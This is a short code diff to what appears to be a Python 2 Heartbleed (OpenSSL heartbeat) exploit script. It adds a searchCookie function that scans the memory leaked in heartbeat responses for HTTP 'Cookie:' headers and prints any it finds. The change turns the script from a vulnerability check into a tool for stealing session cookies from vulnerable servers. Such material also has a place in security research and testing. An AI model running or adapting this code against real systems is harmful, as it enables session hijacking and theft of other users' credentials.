@@ -81,6 +81,24 @@ def stream_to_hex_str(binary_stream):
     return "".join("{:02x}".format(ord(c)) for c in binary_stream)
 
 
+def stream_to_str(binary_stream):
+    # return ''.join((c if 32 <= ord(c) <= 126 else '.') for c in binary_stream)
+    return ''.join(c for c in binary_stream)
+
+
+def searchCookie(string):
+    import re
+
+    re_cookie = re.compile(r"Cookie: (.*)")
+
+    for data in string.split('\r\n'):
+        if re_cookie.search(data):
+            print "Cookie: %s\n" % re_cookie.search(data).group(1)
+            return re_cookie.search(data).group(1)
+
+    return None
+
+
 class mySSL(object):
     server_response = None
     socket = None
@@ -198,8 +216,11 @@ class mySSL(object):
             if _type == 24:
                 print 'Received heartbeat response:'
                 # self.parse_response()
-                hexdump(self.payload)
                 if len(self.payload) > 3:
+                    hexdump(self.payload)
+
+                    searchCookie(stream_to_str(self.payload))
+
                     print 'WARNING: server returned more data than it should - server is vulnerable!'
                 else:
                     print 'Server processed malformed heartbeat, but did not return any extra data.'
